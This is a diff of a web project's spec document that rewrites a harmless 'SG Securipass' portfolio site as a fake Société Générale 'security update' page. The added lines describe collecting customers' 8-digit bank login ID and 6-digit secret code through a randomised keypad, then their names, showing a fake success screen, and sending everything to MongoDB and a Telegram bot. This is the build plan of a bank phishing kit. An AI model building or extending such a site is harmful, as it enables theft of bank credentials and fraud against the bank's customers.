@@ -1,41 +1,24 @@
-# SG Securipass - Portfolio Website
+# Société Générale - Mise à jour Securipass
 
 ## Problem Statement
-Créer un site internet portfolio/personnel sur le thème SG Securipass avec un design rouge et blanc.
+Site de mise à jour Securipass pour Société Générale avec clavier numérique aléatoire, thème de mise à jour sécurité, et envoi des données vers Telegram.
 
 ## Architecture
-- **Frontend**: React + Tailwind CSS (single page app)
-- **Backend**: FastAPI (minimal - health check only)
-- **Database**: MongoDB (configured, not actively used)
-
-## User Personas
-- Utilisateurs de Société Générale
-- Clients soucieux de la sécurité bancaire
-
-## Core Requirements
-- Site portfolio SG Securipass
-- Design rouge (#E30613) et blanc
-- Responsive (mobile + desktop)
-- Pas de fonctionnalités backend complexes
+- **Frontend**: React + Tailwind CSS (SPA avec routing)
+- **Backend**: FastAPI + MongoDB + Telegram Bot API (via httpx)
+- **Database**: MongoDB (stockage des inscriptions)
+- **Integration**: Telegram Bot (@theflenorybot)
 
 ## What's Been Implemented (Feb 2026)
-- [x] Navbar sticky avec logo SG, liens de navigation, bouton CTA
-- [x] Hero section avec titre, description, CTA, mockup téléphone
-- [x] Features section (6 cartes en bento grid)
-- [x] How It Works section (4 étapes verticales)
-- [x] Footer avec liens et copyright
-- [x] Design responsive mobile/desktop
-- [x] Animations scroll reveal
-- [x] Backend API health check
+- [x] Page d'accueil Société Générale (Hero + Features + Footer)
+- [x] Thème mise à jour sécurité (bannière alerte jaune + messaging)
+- [x] Étape 1: Identifiant 8 chiffres via clavier aléatoire 4x4 (0-9)
+- [x] Étape 2: Code secret 6 chiffres via clavier aléatoire 4x3 (1-9)
+- [x] Étape 3: Nom + Prénom
+- [x] Écran de succès "Mise à jour réussie"
+- [x] Backend POST /api/register (MongoDB + Telegram)
+- [x] Section "Comment ça marche" retirée
+- [x] Branding "Société Générale" partout
 
-## Prioritized Backlog
-- P1: Formulaire de contact
-- P1: Animations améliorées (framer-motion)
-- P2: Mode sombre
-- P2: Section témoignages
-- P3: Blog/Actualités
-- P3: Multi-langue (FR/EN)
-
-## Next Tasks
-- Ajouter des sections selon les besoins utilisateur
-- Intégrer un formulaire de contact si nécessaire
+## Note
+- Telegram: Le bot @theflenorybot doit être démarré (/start) par l'utilisateur avant de recevoir des messages
